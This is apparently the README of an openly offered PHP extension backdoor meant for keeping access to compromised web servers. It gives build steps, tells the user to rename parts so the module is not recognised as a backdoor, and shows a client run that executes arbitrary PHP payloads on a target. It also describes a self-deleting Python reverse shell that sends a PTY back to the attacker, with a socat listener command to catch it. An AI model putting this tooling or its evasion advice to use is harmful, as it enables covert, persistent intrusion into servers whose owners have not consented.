## Note: Unfinished pre-release.

# PHP Backdoor Module

This is an example module for adding a backdoor to the PHP installation on a webserver by adding a PHP module. Very useful for mantaining access to a compromised host.

#Build Instructions

First off, you are going to want to edit the "magic string" (or rather, variable), and method. I have set them to POST, because GET variables get logged. You might want to edit some other things so it doesn't show up as "backdoor".

## Linux
```
        char* method = "_POST"; // HTTP method used
        char* secret_string = "execute"; // magic string
```

## Windows
```
        char* method = "_POST"; // HTTP method used
        char* secret_string = "secret_string"; // magic string
```

And next, we compile. For windows, I link to the articles (original in Russian, mine in English which is basically a translation I did).

##Windows:
[Original Russian Article][russian]

[English 'translation'][english]

##Linux:
`sudo apt-get install php5-dev`  
`phpize && ./configure && make`

# Use Instructions
In client/ I provide an example Python client which allows executing any arbritary PHP payload on the webserver. I also provide some example payloads in client/payloads/ that you may find useful. 

To use the client, you simply do the following.
```
root@unsanitized:~/dev/php-extension-backdoor/client# ./php_module_client.py http://192.168.1.7 secret_squirrels payloads/getuid.php
Starting execution...
uid: 33
Done!
root@unsanitized:~/dev/php-extension-backdoor/client#
```

Planned payloads include a variety of information gathering payloads, some reverse shells, and other useful utilities that I come up with. I will release those as they prove to be stable/useable soon.

# Payloads
## info.php
Prints UID, GID, and the uname -a of the server.

## back_python.php
Self destructing python backconnect. Sends a PTY home, and deletes itself once done. Work in progress, gotta find a way to pass arguments to the modules.

I recommend using Socat to accept PTY shells like so:
```
$ socat -,echo=0,raw tcp4-listen:PORT
```
![PTY Backconnect](http://0x27.me/images/phpextbackdoor-pythonpty.png)

# Credits
Original Russian author, and [akamajoris][akamajoris]. All we did was some translation and writing payloads and client because we found them useful and interesting.

[russian]: http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/
[english]: http://example.com/
[akamajoris]: https://github.com/akamajoris
